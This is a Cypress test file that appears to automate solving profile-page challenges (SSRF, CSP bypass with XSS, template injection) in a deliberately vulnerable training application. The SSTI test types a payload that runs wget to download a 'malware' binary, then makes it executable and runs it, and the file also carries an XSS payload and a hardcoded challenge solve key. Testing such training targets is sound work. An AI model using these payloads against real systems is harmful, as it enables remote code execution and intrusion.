describe('/profile', () => {
  beforeEach(() => {
    cy.login({ email: 'admin', password: 'admin123' })
  })
  describe('challenge "ssrf"', () => {
    it('should be possible to request internal resources using image upload URL', () => {
      cy.visit('/profile')

      cy.get('#url').type(
        `${Cypress.config('baseUrl')}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`
      )
      cy.get('#submitUrl').click()
      cy.visit('/')
      cy.expectChallengeSolved({ challenge: 'SSRF' })
    })
  })

  describe('challenge "usernameXss"', () => {
    it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.visit('/profile')
          cy.get('#url').type(
            "https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval'"
          )
          cy.get('#submitUrl').click()
          cy.get('#username').type('<<a|ascript>alert(`xss`)</script>')
          cy.get('#submit').click()

          cy.on('window:alert', (t) => {
            expect(t).to.equal('xss')
          })

          cy.get('#username').clear()
          cy.get('#username').type('αδмιη')
          cy.get('#submit').click()

          cy.get('#url').type(
            `${Cypress.config('baseUrl')}/assets/public/images/uploads/default.svg`
          )
          cy.get('#submitUrl').click()
          cy.visit('/#/')
          cy.expectChallengeSolved({ challenge: 'CSP Bypass' })
        }
      })
    })
  })

  describe('challenge "ssti"', () => {
    it('should be possible to inject arbitrary nodeJs commands in username', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.visit('/profile')
          cy.get('#username').type(
            "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
            { parseSpecialCharSequences: false }
          )
          cy.get('#submit').click()
          cy.request(
            '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3'
          )
          cy.visit('/')
          // void browser.driver.sleep(10000);
          // void browser.waitForAngularEnabled(true);
          cy.expectChallengeSolved({ challenge: 'SSTi' })
        }
      })
    })
  })
})
